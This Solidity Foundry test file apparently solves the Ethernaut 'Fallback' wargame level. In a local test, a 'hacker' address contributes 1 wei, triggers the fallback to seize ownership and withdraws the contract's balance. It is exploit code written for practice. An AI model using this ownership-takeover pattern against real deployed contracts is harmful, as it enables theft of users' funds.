// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/Fallback/Fallback.sol";
import "../src/Fallback/FallbackFactory.sol";
import "../src/Ethernaut.sol";

contract FallbackTest is Test {
    Ethernaut private _ethernaut;
    FallbackFactory private _fallbackFactory;
    Fallback private _fallback;

    address private _hacker;

    modifier testWrapper() {
        _ethernaut.registerLevel(_fallbackFactory);
        vm.startPrank(_hacker);
        address instance = _ethernaut.createLevelInstance(_fallbackFactory);
        _fallback = Fallback(payable(instance));
        _;
        bool passed = _ethernaut.submitLevelInstance(payable(instance));
        assertTrue(passed);
        vm.stopPrank();
    }

    function setUp() public {
        _hacker = address(0xa);

        _ethernaut = new Ethernaut();
        _fallbackFactory = new FallbackFactory();

        vm.deal(_hacker, 1 ether);
    }

    function testFallbackHack() public testWrapper {
        showHackBefore();

        _fallback.contribute{value: 1 wei}();
        assertEq(_fallback.getContribution(), 1 wei);

        (bool success, ) = payable(address(_fallback)).call{value: 1 wei}("");
        assertTrue(success);

        _fallback.withdraw();

        showHackAfter();
    }

    function showHackBefore() private view {
        console2.log("_fallback owner before:", _fallback.owner());
        console2.log("_fallback balance before:", address(_fallback).balance);
        console2.log("hacker balance before:", address(_hacker).balance);
    }

    function showHackAfter() private view {
        console2.log("_fallback owner after:", _fallback.owner());
        console2.log("_fallback balance after:", address(_fallback).balance);
        console2.log("hacker balance after:", address(_hacker).balance);
    }
}
